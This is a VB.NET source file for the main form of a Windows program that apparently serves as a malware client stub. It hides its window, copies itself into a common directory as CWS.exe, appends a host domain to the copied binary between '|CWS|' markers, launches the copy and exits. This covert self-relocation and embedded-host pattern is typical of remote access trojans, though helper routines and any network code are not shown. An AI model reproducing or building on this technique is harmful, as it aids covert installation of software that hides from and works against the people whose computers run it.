Imports System.IO

Public Class Main

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Parametros = Command()
        Me.Hide()
        CheckForIllegalCrossThreadCalls = False
        CheckThePath()
        ReadArgumentLine()
    End Sub

    Sub ReadArgumentLine()
        Try
            If Parametros = Nothing Then
            ElseIf Parametros = "/Update" Then
                LoadConfig()
                CheckForUpdates()
                Exit Sub
            End If
            Init()
        Catch ex As Exception
            AddToLog("[ReadArgumentLine@Main]Error: ", ex.Message, True)
        End Try
    End Sub

    Sub Init()
        Me.Hide()
        Try
            'verificar si es o no el primer inicio.
            Comun()
            If IsFirstStart() Then
                TheFirstStart()
            Else
                TheSecondStart()
            End If
        Catch ex As Exception
            AddToLog("[Init@Main]Error: ", ex.Message, True)
        End Try
    End Sub

    Sub CheckThePath()
        Try
            If Application.StartupPath <> DIRCommons Then
                If My.Computer.FileSystem.FileExists(DIRCommons & "\CWS.exe") Then
                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\CWS.exe")
                End If
                LoadInject()
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\CWS.exe")
                ReInject(DIRCommons & "\CWS.exe", HostDomain)
                Process.Start(DIRCommons & "\CWS.exe")
                End
            End If
        Catch ex As Exception
            AddToLog("[CheckThePath@Main]Error: ", ex.Message, True)
        End Try
    End Sub

    Sub ReInject(ByVal filePath As String, ByVal inject As String)
        Try
            Dim stub As String
            Const FS1 As String = "|CWS|"
            Dim FinalExe As String = filePath
            Dim bytesEXE As Byte() = System.IO.File.ReadAllBytes(Application.ExecutablePath)
            File.WriteAllBytes(FinalExe, bytesEXE)
            FileOpen(1, FinalExe, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            FileOpen(1, FinalExe, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, stub & FS1 & inject & FS1)
            FileClose(1)
        Catch ex As Exception
            AddToLog("[ReInject@Main]Error: ", ex.Message, True)
        End Try
    End Sub

End Class